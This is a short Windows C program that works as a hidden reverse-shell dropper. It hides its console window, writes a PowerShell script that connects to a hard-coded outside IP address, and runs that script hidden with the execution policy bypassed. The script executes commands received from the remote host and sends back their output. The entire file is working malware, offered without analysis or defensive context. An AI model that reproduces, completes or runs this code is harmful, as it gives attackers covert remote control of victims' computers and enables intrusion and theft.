#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

int main(int argc, char *argv[])
{
  ShowWindow (GetConsoleWindow(), SW_HIDE);

   char command[5100];

strcpy(command, "echo $client = New-Object System.Net.Sockets.TCPClient(\"159.89.214.31\",serveo_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535^|%{0};while(($i ^= $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data ^= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback ^= (iex $data 2^>^&1 ^| Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() > %USERPROFILE%\\rs.ps1 & start /b /min powershell -NoExit -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\rs.ps1");
system(command);
return 0;
}

